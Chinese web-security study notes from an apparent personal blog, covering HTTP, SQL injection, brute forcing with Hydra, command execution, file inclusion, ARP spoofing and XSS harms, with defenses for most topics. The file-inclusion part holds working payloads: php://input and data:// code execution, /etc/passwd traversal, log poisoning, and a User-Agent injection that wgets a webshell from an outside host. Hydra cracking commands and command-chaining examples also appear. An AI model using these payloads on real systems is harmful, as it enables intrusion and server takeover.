HTTP协议目前最新版的版本是1.1，HTTP是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>
HTTP遵循请求（Request）/应答（Response）模型，Web浏览器向Web服务器发送请求时，Web服务器处理请求并返回适当的应答，如图所示。</p>
<p>HTTP使用一种基于消息的模型：客户端发送一条请求消息，而后由服务器返回一条响应消息。</p>
<p><strong>HTTP请求</strong></p>
<p>HTTP请求包括三部分，分别是请求行（请求方法）、请求头（消息报头）和请求正文。<br>
HTTP请求第一行为请求行，由三部分组成，第一部分说明了该请求时POST请求，第二部分是一个斜杠（/login.php），用来说明请求是该域名根目录下的login.php，第三部分说明使用的是HTTP1.1版本。<br>
HTTP请求第二行至空白行为请求头（也被称为消息头）。其中，HOST代表请求主机地址，User-Agent代表浏览器的标识，请求头由客户端自行设定。<br>
HTTP请求第三行为请求正文，请求正文是可选的，它最常出现在POST请求方式中。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137217773.png" alt="" loading="lazy"></p>
<p><strong>HTTP响应</strong></p>
<p>HTTP响应的第一行为响应行，其中有HTTP版本（HTTP/1.1）、状态码（200）以及消息“OK”。<br>
第二行至末尾的空白行为响应头，由服务器向客户端发送。<br>
消息头之后是响应正文，是服务器向客户端发送的HTML数据。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137221463.png" alt="" loading="lazy"></p>
<p><strong>HTTP请求方法</strong></p>
<p>GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。<br>
POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。<br>
<strong>HEAD</strong>：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。<br>
<strong>PUT</strong>：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626137441142.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1626137640179.png" alt="" loading="lazy"></figure>
<p>PUT：向指定的目录上传附加文件<br>
DELETE：删除指定的资源<br>
COPY：将指定的资源复制到Destination消息头的指定的位置<br>
SEARCH：在一个目录路径中搜索资源<br>
PROPFIND：获取与指定资源有关的信息，如作者，大小与内容类型<br>
TRACE：在响应中返回服务器收到的原始请求，可以使用这种方法避开阻止跨站点脚本的防御</p>
<p><strong>状态码</strong><br>
1xx：信息提示，表示请求已经被成功接收，继续处理<br>
2xx：请求被成功提交<br>
3xx：客户端被重定向到其他资源<br>
4xx：客户端错误状态码，格式错误或者不存在资源<br>
5xx：描述服务器内部错误</p>
<p>eg：<br>
200：客户端请求成功<br>
302：重定向<br>
404：请求资源不存在<br>
400：客户端请求有语法错误不能被服务器解析<br>
401：请求未经授权<br>
403：服务器收到请求，但是拒绝提供服务<br>
500：服务器内部错误<br>
503：服务器当前不能处理客户端的请求</p>
<p>拦截HTTP请求的分析点：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626138712203.png" alt="" loading="lazy"></p>
<p>Host 请求报头域主要用于指定被请求资源的Internet主机和端口。<br>
User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。<br>
Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。<br>
Cookie 是非常重要的请求头，常用来表示请求者的身份等。<br>
Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。</p>
<p>响应<br>
Server<br>
Location<br>
Content-Type<br>
Content-Encoding<br>
Content-Length<br>
Connection</p>
<p>Server 服务器使用的Web服务器名称。<br>
Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。<br>
Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。<br>
Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。<br>
Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。<br>
Connection 允许发送指定连接的选项。</p>
<p>Fiddler是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。<br>
Burp Suite是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
<h1 id="sql注入">SQL注入</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626147562167.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626147659762.png" alt="" loading="lazy"></p>
<p>静态网页：<br>
html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。<br>
1.不依赖数据库<br>
2.灵活性差，制作、更新、维护麻烦<br>
3.交互性交差，在功能方面有较大的限制<br>
4.安全，不存在SQL注入漏洞</p>
<p>动态网页：<br>
asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。<br>
1.依赖数据库<br>
2.灵活性好，维护简便<br>
3.交互性好，功能强大<br>
4.存在安全风险，可能存在SQL注入漏洞</p>
<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1626147842178.png" alt="" loading="lazy"></figure>
<p>sql注入定义：<br>
SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<pre><code>   具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句
</code></pre>
<p><strong>解释性语言</strong><br>
正是基于前面背景的认识，我们知道SQL语言是解释型语言，解释型语言的基本特征就是代码与数据的不区分，从而存在注入数据改变原有语义的缺陷。而SQL注入的本质正是基于此，改变原有语义，注入执行。<br>
就如生活中的造句一样，比如：<br>
我要吃（），正常说（饭），大家都觉得很正常，如果说（虫子），大家就觉得这人口味好重，意思就完全不一样了。</p>
<p><strong>SQL注入作用</strong></p>
<p>绕过登录验证：使用万能密码登录网站后台等<br>
获取敏感数据：获取网站管理员帐号、密码等<br>
文件系统操作：列目录，读取、写入文件等<br>
注册表操作：读取、写入、删除注册表等<br>
执行系统命令：远程执行命令</p>
<p><strong>SQL注入过程</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148004241.png" alt="" loading="lazy"></p>
<p><strong>场景</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148045381.png" alt="" loading="lazy"></p>
<p><strong>数据库注释语法</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148084746.png" alt="" loading="lazy"></p>
<p><strong>SQL注入分类</strong></p>
<p>按照数据类型：数字型，字符型<br>
按返回结果：显错注入，盲注<br>
其他：<br>
post注入：注入字段在post数据中<br>
cookie注入同理<br>
搜索注入：注入处为搜索的点<br>
Base64注入：注入字符串需要经过base64加密<br>
布尔型注入：根据返回页面判断条件真假的注入<br>
时间延迟盲注：即不能根据页面返回内容判断任何信息，用条件语句查看延迟语句是否执行判断<br>
报错会先注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中<br>
联合查询型注入：可以使用union的情况下的注入<br>
堆查询注入：可以同时执行多条语句的执行时的注入</p>
<p>利用工具：sqlmap，jsql<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626148527402.png" alt="" loading="lazy"></p>
<p><strong>SQL注入危害：</strong><br>
这些危害包括但不局限于：</p>
<p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>
网页篡改：通过操作数据库对特定网页进行篡改。<br>
网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>
数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>
服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>
破坏硬盘数据，瘫痪全系统。</p>
<p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p>
<p>防御：<br>
过滤特殊字符：<br>
单引号，双引号，斜杠，反斜杠，冒号，空字符等的字符<br>
过滤的对象：<br>
用户的输入<br>
提交的url请求中的参数部分<br>
从cookie中得到的数据<br>
部署防sql注入系统或脚本</p>
<h1 id="逻辑漏洞">逻辑漏洞</h1>
<pre><code>   逻辑漏洞只出现于业务流程中（模块功能），也就是说，网站的任何部分都有可能存在着逻辑漏洞。
</code></pre>
<p>挖掘逻辑漏洞的思路步骤如下：<br>
1.发现网站所提供的功能模块，比如：修改密码，找回密码，修改资料等；<br>
2.针对具体功能确定业务流程，详细划分具体步骤；<br>
3.拦截请求，分析各项参数所代表的含义；<br>
4.修改参数值，尝试触发逻辑漏洞；<br>
5.返回第2步骤，对其他功能继续测试。<br>
挖掘逻辑漏洞的两个重点，分析业务流程和拦截请求修改</p>
<h1 id="2021-07-14">2021-07-14</h1>
<h1 id="暴力破解">暴力破解</h1>
<p>定义：暴力破解也被称为枚举测试，穷举法测试，是一种针对密码破译的方法，即：将密码逐个比较，知道找出 真正的密码为止。<br>
攻击者在渗透目标的时候，刚开始可能并不会直接采取暴力破解的方式去入侵，因为使用暴力破解方式是一项比较耗时的攻击。一般攻击者对应用程序“没办法”时才会采取这种手段<br>
B/S架构利用burp suite<br>
C/S架构利用THC-Hydra<br>
官网：https://www.thc.org/thc-hydra/<br>
项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
<p>支持的协议：<br>
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
<p>官网：https://www.thc.org/thc-hydra/<br>
项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
<p>支持的协议：<br>
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
<p>举例：破解3389：<br>
Hydra.exe –l administrator –P c:\pass.txt 192.168.1.123 rdp –V</p>
<p>破解FTP：<br>
Hydra.exe –l admin –P c:\pass.txt –t 5 192.168.1.123 ftp</p>
<p>破解SSH：<br>
Hydra.exe –L users.txt –P password.txt –e n –t 5 –vV 192.168.1.123 ssh</p>
<p>破解MySQL密码：<br>
Hydra.exe –L c:\users.txt –P c:\pass.txt 192.168.1.123 mysql</p>
<p>防止暴力破解：<br>
1.密码的复杂性（八位以上的字母+数字+特殊字符）<br>
2.验证码（图片，手机验证码，邮箱验证码，答题验证码）<br>
3.登陆策略（限制登陆错误次数）</p>
<p>#远程执行漏洞</p>
<p>RCE漏洞：远程命令执行漏洞； 应用程序有时需要调用一些执行系统命令的函数，如在PHP当中，使用system,exec,shell_exec,passthru,popen,proc_popen等函数可以执行系统命令。<br>
当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成RCE攻击，这就是RCE漏洞。<br>
命令执行漏洞是指攻击者可以随意执行系统命令。它属于高危漏洞之一，也属于代码执行的范畴。<br>
命令执行漏洞不仅存在于B/S架构中，在C/S架构中也常常遇到。</p>
<p>ping 127.0.0.1 &amp;&amp; net user        &amp;&amp;前面的语句若为假则直接报出错，也不执行后边的命令了。 要想继续执行&amp;&amp;后边的命令，那前面的语句只能为真！<br>
ping 127.0.0.1|whoami      直接执行后边的命令<br>
ping 2 || whoami   当前面的语句执行出错时，执行后边的语句</p>
<p>任何脚本语言都可以调用操作系统命令，而各个脚本语言的实现方式都不一样。</p>
<p>区别：<br>
命令执行漏洞是直接调用操作系统命令<br>
代码执行漏洞则是靠执行脚本代码调用操作系统命令</p>
<p><strong>漏洞防范</strong><br>
1：尽量不要使用命令执行函数<br>
2：在进入执行命令函数、方法之前，变量一定要做好过滤，对敏感字符转义<br>
3：在使用动态函数之前，确保使用的函数是指定的函数之一<br>
4：客户端提交的变量在进入执行命令函数前要做好过滤和检测<br>
5：对PHP语言来说，不能完全控制的危险函数最好不要使用</p>
<h1 id="文件包含漏洞">文件包含漏洞</h1>
<p>原理解析：开发人员通常会把可重复使用的函数写道单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程被称为包含</p>
<p>文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>
<p>当被包含的文件在远程服务器时，就形成的远程文件包含漏洞。</p>
<p>一些Web站点允许用户输入时指定文件流或允许用户上传文件到服务器。一段时间后web程序访问用户提供的文件。这样，web程序就会执行恶意程序。<br>
如果文件在本地叫做Local File Inclusion(LFI)，文件在其他主机上的攻击叫做Remote File Inclusion(RFI)。<br>
注意：file inclusion（文件包含）与arbitrary file access（任务文件访问）或file disclosure（文件泄露）不同。</p>
<p>漏洞防范：<br>
1.严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点在于被包含文件是否可以被外部控制<br>
2.路径限制：限制被包含的文件只能在某一文件夹内，禁止目录跳转字符如：&quot;../&quot;<br>
3.包含文件验证：验证被包含的文件是否是白名单中的一员<br>
4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include（&quot;test.php&quot;）；</p>
<p>思考与要点<br>
1.PHP中的四个文件包含函数(require,require_once,include,include_once)，因此在挖掘文件包含漏洞时只需要跟踪这四个函数的代码。<br>
2.php远程包含漏洞需要allow_url_include 为on<br>
3.挖掘文案金包含漏洞需要对代码有一定的基础<br>
4.文件包含漏洞dabufenchuxianzaiphp中，其他的如asp，asp.net，jsp也会存在，但相对很少</p>
<h1 id="详解文件包含">详解文件包含</h1>
<p><strong>文件包含原理</strong><br>
文件包含<br>
开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
<p>文件包含漏洞<br>
开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
<p>0x01文件包含分类<br>
本地文件包含<br>
包含服务器本身存在的恶意文件<br>
a.txt</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre>
<p>b.php</p>
<pre><code>&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p>payload:</p>
<pre><code>localhost/b.php?id=a.txt //返回phpinfo页面
</code></pre>
<p>注：<br>
两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>
被包含的页面的后缀无论是什么都会当做PHP解析</p>
<p>远程文件包含<br>
包含其他网站上的恶意文件<br>
远程文件包含利用条件：</p>
<p>在php.ini中allow_url_fopen=on、allow_url_include=on</p>
<p>payload：</p>
<pre><code>localhost/b.php?id=http://ip/文件路径
</code></pre>
<p>注：</p>
<p>远程包含的文件路径必须是绝对路径</p>
<p>0x02 常用文件包含函数<br>
PHP</p>
<pre><code>include()
</code></pre>
<p>当使用该函数包含文件时，只有代码执行到include()函数是才将文件包含进来，发生错误时只给出一个警告，继续向下执行</p>
<pre><code>include_once()
</code></pre>
<p>功能和include()相同，区别在于当重复调用同意文件时，程序只调用一次</p>
<pre><code>requier()
</code></pre>
<p>使用require函数包含文件时，只要程序一执行，立即调用脚本；如果前者执行发生错误，函数或输出错误信息，并终止脚本运行</p>
<pre><code>require_once()
</code></pre>
<p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
<pre><code>jsp/servlet
ava.io.file()

java.io.filereader()

ASP
include file

include virtual

0x03 各个协议实现命令执行
%00截断
</code></pre>
<p>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，<br>
如果有就需要使用%00进行截断<br>
当php版本&lt;=5.2使用%00截断</p>
<p>file：//:用于访问本地文件系统</p>
<p>条件(php.ini)：</p>
<pre><code>allow_url_fopen   off/on
allow_url_include off/on
</code></pre>
<p>使用方法：<code>file：//[文件的绝对路径和文件名]</code></p>
<p>php://:访问各个输入输出流</p>
<p>php伪协议：<br>
php：//filter：用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：<br>
allow_url_fope   off/on<br>
allow_url_include off/on</p>
<pre><code>php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；
条件(php.ini)：
    allow_url_fope   off/on
    allow_url_include on

php://stdin是只读的，php://stdout 和 php://stderr 是只写的。
php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
php://fd 允许直接访问指定的文件描述符。

zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名
</code></pre>
<p>条件：</p>
<pre><code>allow_url_fope   off/on
allow_url_include off/on
</code></pre>
<p>zip://使用方法：</p>
<pre><code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
</code></pre>
<p>bzip2://使用方法：</p>
<pre><code>bzip2://file.bz2
</code></pre>
<p>zlib://使用方法：</p>
<pre><code>zlib://file.gz

data://
</code></pre>
<p>条件：</p>
<pre><code>allow_url_fope   on
allow_url_include on123
http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
http://127.0.0.1/cmd.php?file=data://text/plain;base644,加密的php代码
</code></pre>
<p>在这里插入图片描述</p>
<p>phar://:数据流包装器<br>
http:// 网址<br>
ftp:// 访问FTP url<br>
ssh2:// Secure Shell 2<br>
expect:// 处理交互式的流<br>
glod:// 查找匹配的文件路径</p>
<p>0x04 文件包含利用场景<br>
包含上传文件<br>
用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用<br>
防御：</p>
<pre><code>做好上传限制
隐藏好文件路径
设置访问权限、执行权限
</code></pre>
<p>伪协议<br>
php：//input：</p>
<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。<br>
条件：</p>
<pre><code>php &lt;5.0 ，allow_url_include=Off 情况下也可以用
php &gt; 5.0，只有在allow_url_fopen=On 时才能使用
</code></pre>
<p>例：</p>
<pre><code>http：//localhost/include/file.php?file=php://input     //URL
&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;  //POST,创建一个文件a.php；并写入phpinfo
</code></pre>
<p>data://：</p>
<p>将原本的include的文件流重定向到了用户可控制的输入流中<br>
条件：</p>
<pre><code>allow_url_include=On
php &gt; 5.2
</code></pre>
<p>例：</p>
<pre><code>http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密&lt;？php system(whoami);？&gt;；直接执行命令
http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行
</code></pre>
<p>php://filter：</p>
<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过<br>
例：</p>
<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径
http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径
</code></pre>
<p>防御：<br>
尽量使用安全版本的php<br>
做好php的安全配置<br>
对相应目录做相应权限设置</p>
<p>包含日志文件<br>
1、日志的默认路径<br>
/etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux<br>
D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003<br>
C:WINDOWSsystem32Logfiles                     //iis6.0+win2003<br>
%SystemDrive%inetpublogsLogFiles            //iis7.0+win2003<br>
nginx 日志文件在用户安装目录的logs目录下</p>
<p>2、web中间件默认配置uoh文件<br>
/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux<br>
C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003<br>
C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</p>
<p>3、利用<br>
访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：<br>
http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</p>
<p>4、防御<br>
隐藏或修改默认日志文件<br>
设置日志文件读取权限</p>
<p>包含/proc/self/environ<br>
1、找文件包含漏洞<br>
www.aaa.com/view.php?page=../<br>
www.aaa.com/view.php?page=../../../../../etc/passwd</p>
<p>2、检查proc/self/environ是否可以访问<br>
www.aaa.com/view.php?page=../../../../../proc/self/environ</p>
<p>3、如果可读就注入代码<br>
访问：www.aaa.com/view.php?page=../../../../../proc/self/environ<br>
选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.</p>
<p>4、访问shell</p>
<p>5、防御：<br>
设置proc/self/environ不可访问</p>
<p>包含Session文件</p>
<pre><code>?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件
</code></pre>
<p>0x05 常见的绕过与防御<br>
%00截断（php&lt;5.3.4）</p>
<p>说明：<br>
PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。<br>
防御：<br>
禁用0字节</p>
<p>超长字符截断</p>
<p>利用：<br>
利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。<br>
我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>
而利用&quot;./&quot;的方式即可构造出超长目录字符串<br>
防御：<br>
限制用户输入字符长度</p>
<p>任意目录遍历</p>
<p>利用：<br>
使用&quot;../../../&quot;这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)&quot;。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)<br>
防御：<br>
目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。<br>
open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)12345</p>
<p>问号截断</p>
<p>利用：</p>
<pre><code>http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
</code></pre>
<p>防御：<br>
关闭远程文件包含的配置选项allow_url_include = Off</p>
<p>0x06 防御总结<br>
1、无需情况下设置allow_url_include和allow_url_fopen为关闭<br>
2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir<br>
3、尽量不使用动态包含<br>
4、严格检查变量是否已经初始化。<br>
5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，<br>
进行严格的检查，参数中不允许出现../之类的目录跳转符。<br>
6、严格检查include类的文件包含函数中的参数是否外界可控。<br>
7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。<br>
8、在发布应用程序之前测试所有已知的威胁。</p>
<p>参考文章：https://blog.csdn.net/xg_ren/article/details/79040414</p>
<h1 id="社会工程学">社会工程学</h1>
<p>社会工程学简称社工，它是通过对受害者心里弱点，本能反应，好奇，信任，贪婪等心理陷阱进行诸如欺骗，伤害的一种危害手段<br>
他并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为是最警惕最小心的人，也一样会被高明的社会工程学的手段损害利益<br>
一个成功的社工师必然是拥有“读心术”的沟通专家，当然，也有人称其为骗子，间谍，社工师就是以这样的名义存在的，对社会工程学有了解的人都应该知道的一个名字-凯文米特尼克以及可以说是每个社工师都比看的一本书--欺骗的艺术</p>
<p><strong>社会工程学的基本特征</strong></p>
<p>社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取系统的秘密。</p>
<p>社会工程学是一种与普通的欺骗/诈骗不同层次的手法，因为社会工程学需要搜集大量的信息针对对方的实际情况，进行心理战术。</p>
<p>社会工程学往往是一种利用人性脆弱点，贪婪等等的心理表现进行攻击，是防不胜防的。</p>
<p><strong>生活中的社会工程学</strong></p>
<p>环境渗透（攻击者采取各种手段进入目标内部，然后利用各种便利条件进行观察或窃听，得到自己所需的信息）</p>
<p>身份伪造（隐藏真实身份，例如：伪造身份证、ID卡等）</p>
<p>冒名电话（冒充亲戚、朋友、同学、同事、 上司、下属、高级官员、知名人士等通过电话从目标处获取信息）</p>
<p>个体配合（如果目标内部人员已经心存不满甚至有了报复的念头，那么……）</p>
<p><strong>网络中的社会工程学</strong></p>
<p>地址欺骗<br>
邮件欺骗<br>
窗口欺骗<br>
其它欺骗</p>
<h1 id="arp欺骗攻击">arp欺骗攻击</h1>
<p>ARP是Address Resolution Protocol（地址解析协议）的缩写。在以太网中，两台主机想要通信就必须要知道目标主机的MAC地址，如何获取目标主机的MAC地址呢？这就是地址解析协议ARP的工作。</p>
<p><strong>攻击原理</strong><br>
有时候攻击者在入侵目标时，由于安全措施很到位，不能获得权限，而且服务器只有一个web站点，无法旁注，这时候攻击者就可能通过c段arp嗅探的方式，继续入侵指定的目标站点<br>
c段攻击就是指同一网关下的主机arp嗅探，在嗅探出敏感数据后继续实施对目标站点的渗透</p>
<p>eg：攻击者的目标站点为 www.sangfor.com.cn   服务器ip地址为 192.168.1.100</p>
<p>在无法直接渗透目标服务器时，攻击者就可能去入侵与192.168.1.100在同一网关下的服务器，一般会是192.168.1.x，也就是c段ip，在得到服务器权限后，对目标主机实施arp嗅探</p>
<p>用工具举例说明<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274869809.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274874148.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274878418.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274882340.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274887250.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274889821.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274893442.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274895920.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274899113.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274902464.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274909374.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274912383.png" alt="" loading="lazy"></p>
<p>防御arp攻击<br>
1.静态绑定（对每台主机进行ip和mac地址静态绑定）<br>
2.arp防火墙</p>
<h1 id="2021-07-15">2021-07-15</h1>
<p><strong>xss危害简单概括</strong></p>
<p>网络钓鱼，包括盗取各类用户账号<br>
窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作<br>
劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等<br>
强制弹出广告页面，刷流量等<br>
网页挂马<br>
进行恶意操作，例如任意篡改页面信息，删除文章等<br>
进行大量的客户端攻击，如DDOS攻击<br>
获取客户端信息，例如用户的浏览历史，真实ip，开放端口等<br>
控制受害者机器向其他网站发起攻击<br>
结合其他漏洞进一步扩大攻击<br>
提升用户权限，包括进一步渗透网站<br>
传播XSS跨站脚本蠕虫等</p>
<p><strong>csrf跨站请求伪造</strong></p>
